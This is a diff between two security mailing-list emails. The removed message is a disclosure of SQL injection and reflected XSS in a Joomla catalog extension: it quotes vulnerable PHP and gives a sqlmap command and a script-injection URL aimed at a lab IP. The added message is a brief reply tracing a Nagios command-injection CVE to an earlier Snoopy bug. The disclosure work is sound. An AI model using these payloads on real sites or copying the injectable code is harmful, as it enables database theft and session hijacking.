@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["6192" "Tuesday" "26" "July" "2016" "08:37:28" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<38EF50CD-F76B-4180-8E01-44ED395D68CA@me.com>" "152" "[oss-security] SQLi and Reflected XSS in Huge IT catalog extension v1.0.4 for Joomla" nil nil nil "7" "2016072612:37:28" "[oss-security] SQLi and Reflected XSS in Huge IT catalog extension v1.0.4 for Joomla" (number mark "U       larry0@me.co Jul 26  152/6192  " thread-indent "\"[oss-security] SQLi and Reflected XSS in Huge IT catalog extension v1.0.4 for Joomla\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["451" "Wednesday" "21" "December" "2016" "23:30:15" "+0100" "Tomas Hoger" "thoger@redhat.com" "<20161221233015.27a0038d@redhat.com>" "19" "Re: [oss-security] Nagios Core < 4.2.2 Curl Command Injection leading to Remote Code Execution [CVE-2016-9565]" nil nil nil "12" "2016122122:30:15" "[oss-security] Nagios Core < 4.2.2 Curl Command Injection leading to Remote Code Execution [CVE-2016-9565]" (number mark "U       thoger@redha Dec 21   19/451   " thread-indent "\"Re: [oss-security] Nagios Core < 4.2.2 Curl Command Injection leading to Remote Code Execution [CVE-2016-9565]\"\n") "<CADSYzsucRUuig5_vSn66P_4oYbw2tSKBHbNbfKGxrF5R4k-uAg@mail.gmail.com>" ("<CADSYzsucRUuig5_vSn66P_4oYbw2tSKBHbNbfKGxrF5R4k-uAg@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 18322 invoked by uid 550); 26 Jul 2016 12:38:18 -0000
+Received: (qmail 3593 invoked by uid 550); 21 Dec 2016 22:30:35 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,181 +12,38 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 18205 invoked from network); 26 Jul 2016 12:37:54 -0000
-X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
- definitions=2016-07-26_09:,, signatures=0
-X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
- clxscore=1015 suspectscore=0 malwarescore=0 phishscore=0 adultscore=0
- bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
- engine=8.0.1-1510270003 definitions=main-1607260142
-From: "Larry W. Cashdollar" <larry0@me.com>
-Content-type: text/plain; charset=utf-8
-Content-transfer-encoding: quoted-printable
-Message-id: <38EF50CD-F76B-4180-8E01-44ED395D68CA@me.com>
-Date: Tue, 26 Jul 2016 08:37:28 -0400
-To: Open Source Security <oss-security@lists.openwall.com>
-MIME-version: 1.0 (Mac OS X Mail 9.3 \(3124\))
-X-Mailer: Apple Mail (2.3124)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=4d515a;
-	t=1469536650; bh=3lt7mUAHQvtSPhRLg98bnnSRlZOdNCmt83II5YIDO6Y=;
-	h=From:Content-type:Subject:Message-id:Date:To:MIME-version;
-	b=CfdXhBHhL+lemSNYvqAvJrhpGL+Fk0rpMbdYpyxUj7gtf88KPB5h80hCM0SCar+j0
- nJwjIVO373tqmRUJ3WNcQH3w3T3zqUEDq681KMQZx/6/eWKDsEb74PtwuBHUFqvbTk
- ivVhA0NkDPZ+DDkNOf/EWrtIagk2bMIIt5fA7B+Vw/ebCEeJ+JX2HwmxEuqAnzozVp
- EQRkfWKVJRU89vk5bwuAFxHkQv3wFGeF/1PCE9Vlh3hkYRvafwze0XvFFdr2ZYjHv0
- Mt3PVrAC5Ck2EaWZvKr3HSnoDrZWfeQSSrUTV4c2n545XHI+dZX0BoMO3CH866RLYv
- fvPFcDbcvjJhQ==
-Subject: [oss-security] SQLi and Reflected XSS in Huge IT catalog extension v1.0.4 for Joomla
+Received: (qmail 3565 invoked from network); 21 Dec 2016 22:30:34 -0000
+Date: Wed, 21 Dec 2016 23:30:15 +0100
+From: Tomas Hoger <thoger@redhat.com>
+To: Dawid Golunski <dawid@legalhackers.com>
+Cc: oss-security@lists.openwall.com
+Message-ID: <20161221233015.27a0038d@redhat.com>
+In-Reply-To: <CADSYzsucRUuig5_vSn66P_4oYbw2tSKBHbNbfKGxrF5R4k-uAg@mail.gmail.com>
+References: <CADSYzsucRUuig5_vSn66P_4oYbw2tSKBHbNbfKGxrF5R4k-uAg@mail.gmail.com>
+MIME-Version: 1.0
+Content-Type: text/plain; charset=US-ASCII
+Content-Transfer-Encoding: 7bit
+X-Scanned-By: MIMEDefang 2.68 on 10.5.11.22
+X-Greylist: Sender IP whitelisted, not delayed by milter-greylist-4.5.16 (mx1.redhat.com [10.5.110.28]); Wed, 21 Dec 2016 22:30:20 +0000 (UTC)
+Subject: Re: [oss-security] Nagios Core < 4.2.2 Curl Command Injection
+ leading to Remote Code Execution [CVE-2016-9565]
 
-Title: SQLi and XSS in Huge IT catalog extension v1.0.4 for Joomla
-Author: Larry W. Cashdollar, @_larry0
-Date: 2015-07-17
-Download Site: http://extensions.joomla.org/extensions/extension/e-commerce=
-/shopping-cart/catalog
-Vendor: www.huge-it.com
-Vendor Notified: 2015-07-17, fixed in v1.0.5
-Vendor Contact: info@huge-it.com
-Description: This extension is designed to help you display the products in=
- the most attractive way. Joomla Catalog Extension has a stylish design wit=
-h convenient construction for displaying the product to the customers.
-Vulnerability:
-The attacker must be logged in with at least manager level access or access=
- to the administrative panel to exploit this vulnerability.
+On Tue, 20 Dec 2016 17:12:58 -0200 Dawid Golunski wrote:
 
-Reflected XSS in file ./views/submissions/tmpl/default.php via message_id p=
-arameter:
+> Vulnerability:
+> Nagios Core < 4.2.2  Curl Command Injection / Remote Code Execution
 
-825:   <input type=3D"hidden" id=3D"message_id" value =3D"<?php echo $_GET[=
-'message_id']; ?>" />
+Your report should mention that this issue was in Snoopy:
 
+https://sourceforge.net/projects/snoopy/
 
-SQL Injection=20
+which was embedded in MagpieRSS, which was embedded in Nagios.
 
-in file ./models/submissions.php via id parameter
-59-        $query =3D $db->getQuery(true);
-60-        $id =3D JRequest::getVar('message_id');
-61-        $this-> updateReadInfo($id);
-62:        $query->select('*,#__huge_it_catalog_products.name as product_na=
-me, #__huge_it_catalog_asc_seller.id as  message_id');
-63-        $query->from('#__huge_it_catalog_asc_seller,#__huge_it_catalog_p=
-roducts');
-64-        $query->where('#__huge_it_catalog_asc_seller.product_id =3D #__h=
-uge_it_catalog_products.id and #__huge_it_catalog_asc_seller.id =3D "'.$id.=
-'"');
-65-        $db->setQuery($query);
-in file ./models/comment.php via projectId parameter:
+> CVE-2016-9565
 
-56-        $db =3D JFactory::getDBO();
-57-       $id =3D JRequest::getVar('projectId');=20
-58-       $query =3D $db->getQuery(true);
-59:        $query->select('*,#__huge_it_catalog_reviews.id as comId, #__hug=
-e_it_catalog_reviews.name as author_name, #__huge_it_catalog_products.name =
-as product_name')
-60-             ->from('#__huge_it_catalog_reviews, #__huge_it_catalog_prod=
-ucts')
-61-         ->where('#__huge_it_catalog_reviews.product_id =3D #__huge_it_c=
-atalog_products.id and #__huge_it_catalog_products.id =3D "'.$id.'"');
-62-        $db->setQuery($query);
+It's the same issue as CVE-2014-5008:
 
-in file ./models/rating.php via projectId parameter:
+http://seclists.org/oss-sec/2014/q3/176
 
-55-        return $results;
-56-    }=20
-57-=20=20=20=20
-58-    public  function getRatingById() {
-59-        $db =3D JFactory::getDBO();
-60:       $id =3D JRequest::getVar('projectId');=20
-61-       $query =3D $db->getQuery(true);
-62-        $query->select('*,#__huge_it_catalog_rating.id as ratId')
-63-             ->from('#__huge_it_catalog_rating, #__huge_it_catalog_produ=
-cts')
-64-         ->where('#__huge_it_catalog_rating.prod_id =3D #__huge_it_catal=
-og_products.id and #__huge_it_catalog_products.id =3D "'.$id.'"');
-65-        $db->setQuery($query);
-
-in file ./models/catalog.php via id parameter:
-
-45:        $id_cat =3D JRequest::getVar('id');
-46-        $query =3D $db->getQuery(true);
-47-        $query->select('#__huge_it_catalog_products.name as name,'
-48-                . '#__huge_it_catalog_products.id ,'
-49-                . '#__huge_it_catalogs.name as catName,'
-50-                . 'catalog_id,#__huge_it_catalog_products.description as=
- productDescription,#__huge_it_catalog_products.parameters as productParame=
-ters,#__huge_it_catalogs.description,image_url,sl_url,sl_type,price,market_=
-price,single_product_url_type,single_product_url_type,#__huge_it_catalog_pr=
-oducts.link_target as productLinkTarget,#__huge_it_catalog_products.orderin=
-g,#__huge_it_catalog_products.published,published_in_sl_width');
-51-        $query->from(array('#__huge_it_catalogs' =3D> '#__huge_it_catalo=
-gs', '#__huge_it_catalog_products' =3D> '#__huge_it_catalog_products'));
-52-        $query->where('#__huge_it_catalogs.id =3D catalog_id')->where('c=
-atalog_id=3D' . $id_cat);
-53-        $query->order('ordering asc');
-54-=20=20=20=20=20=20=20
-55-        $db->setQuery($query);
---
-63:        $id_cat =3D JRequest::getVar('id');
-64-        $query =3D $db->getQuery(true);
-65-        $query->select('*');
-66-        $query->from('#__huge_it_catalog_products');
-67-        $query->where('catalog_id=3D' . $id_cat);
-68-        $db->setQuery($query);
-69-        $results =3D $db->loadObjectList();
-70-        return $results;
-71-    }
-72-
-73-    public function save($data) {
---
-121:        $id_cat =3D JRequest::getVar('id');
-122-        $query =3D $db->getQuery(true);
-123-        $query->update('#__huge_it_catalogs')->set('name =3D"' . $name =
-. '"')->where('id=3D"' . $id_cat . '"');
-124-        $db->setQuery($query);
-125-        $db->execute();
-126-    }
-127-
-128-    function selectStyle() {
-129-        $db =3D JFactory::getDBO();
-130-        $data =3D JRequest::get('post');
-131-          $name =3D $data['name'];
---
-136:        $id_cat =3D JRequest::getVar('id');
-137-        $query =3D $db->getQuery(true);
-138-=20=20=20=20=20=20=20=20
-139-        $query->update('#__huge_it_catalogs')
-140-              ->set('name =3D"' . $name . '"')
-141-              ->set('catalog_list_effects_s =3D"'.$catalog_effects_list=
-.'"')
-142-              ->set('pagination_type =3D"'.$pagination_type.'"')
-143-              ->set('count_into_page =3D"'.$count_into_page.'"')
-144-              ->set('categories =3D"'.$allCategories.'"')
-145-              ->where('id=3D"' . $id_cat . '"');
-146-        $db->setQuery($query);
---
-
-via removeslide parameter:
-
-208:        $id_cat =3D JRequest::getVar('removeslide');
-209:        $id =3D JRequest::getVar('id');
-210-        $db =3D JFactory::getDBO();
-211-        $query =3D $db->getQuery(true);
-212-        $query->delete('#__huge_it_catalog_products')->where('id =3D' .=
- $id_cat);
-213-        $db->setQuery($query);
-214-        $db->execute();
-
-CVE-2016-1000119 XSS
-CVE-2016-1000120 SQLi
-
-Exploit Code:
-	=E2=80=A2 SQLi:
-	=E2=80=A2=20=20
-	=E2=80=A2 $ sqlmap  --load-cookies=3Dcookies.txt -u "http://192.168.0.125/=
-administrator/index.php?option=3Dcom_catalog&view=3Dcatalog&id=3D*" --dbms =
-mysql=20
-	=E2=80=A2=20=20
-	=E2=80=A2 XSS:
-	=E2=80=A2=20=20
-	=E2=80=A2 http://192.168.0.125/administrator/index.php?option=3Dcom_catalo=
-g&view=3Dcatalog&id=3D1--%20%22%3E%3Cscript%3Ealert(1);%3C/script%3E
-Advisory: http://www.vapidlabs.com/advisory.php?v=3D167=
+-- 
+Tomas Hoger / Red Hat Product Security
